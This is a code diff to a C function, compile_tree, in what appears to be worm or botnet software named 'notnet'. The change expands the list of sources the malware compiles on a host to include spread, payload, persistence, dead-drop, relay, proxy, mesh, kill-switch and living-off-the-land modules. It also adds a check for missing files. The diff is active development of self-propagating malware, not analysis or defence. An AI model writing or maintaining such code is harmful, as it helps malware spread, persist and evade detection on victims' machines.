@@ -449,14 +449,21 @@ static int compile_tree(const char *compiler, const char *src_dir,
         /* Child: exec compiler directly, no shell */
         char incdir[600];
         snprintf(incdir, sizeof(incdir), "-I%s/include", src_dir);
-        char n1[600], n2[600], n3[600], n4[600], n5[600], n6[600];
-        snprintf(n1, sizeof(n1), "%s/notnet.c", src_dir);
-        snprintf(n2, sizeof(n2), "%s/src/protocol.c", src_dir);
-        snprintf(n3, sizeof(n3), "%s/src/spread.c", src_dir);
-        snprintf(n4, sizeof(n4), "%s/src/payload.c", src_dir);
-        snprintf(n5, sizeof(n5), "%s/src/persist.c", src_dir);
-        snprintf(n6, sizeof(n6), "%s/src/util.c", src_dir);
-        char *argv[16];
+        /* Source list mirrors the root Makefile (SRCS == DIST_SRC_FILES):
+         * every file extracted into the tree must be linked, or the fallback
+         * binary hits undefined references and can never build (#268). */
+        static const char *const tree_srcs[] = {
+            "notnet.c",
+            "src/protocol.c", "src/spread.c", "src/arch_detect.c",
+            "src/payload.c", "src/persist.c", "src/util.c",
+            "src/deaddrop.c", "src/proxy.c", "src/relay.c",
+            "src/plugin.c", "src/killswitch.c", "src/mesh.c",
+            "src/lotl.c",
+            NULL
+        };
+        const int n_srcs = (int)(sizeof(tree_srcs) / sizeof(tree_srcs[0])) - 1;
+        char paths[14][600];
+        char *argv[24];
         int a = 0;
         argv[a++] = (char *)compiler;
         if (static_link) argv[a++] = "-static";
@@ -465,12 +472,15 @@ static int compile_tree(const char *compiler, const char *src_dir,
         argv[a++] = incdir;
         argv[a++] = "-o";
         argv[a++] = (char *)dest;
-        argv[a++] = n1;
-        argv[a++] = n2;
-        argv[a++] = n3;
-        argv[a++] = n4;
-        argv[a++] = n5;
-        argv[a++] = n6;
+        for (int i = 0; i < n_srcs; i++) {
+            snprintf(paths[i], sizeof(paths[i]), "%s/%s", src_dir, tree_srcs[i]);
+            if (access(paths[i], F_OK) != 0) {
+                fprintf(stderr, "payload_compile: source %s missing from tree\n",
+                        tree_srcs[i]);
+                _exit(127);
+            }
+            argv[a++] = paths[i];
+        }
         argv[a++] = "-lpthread";
         argv[a] = NULL;
         /* Redirect stderr to a file when NOTNET_COMPILE_DEBUG is set,
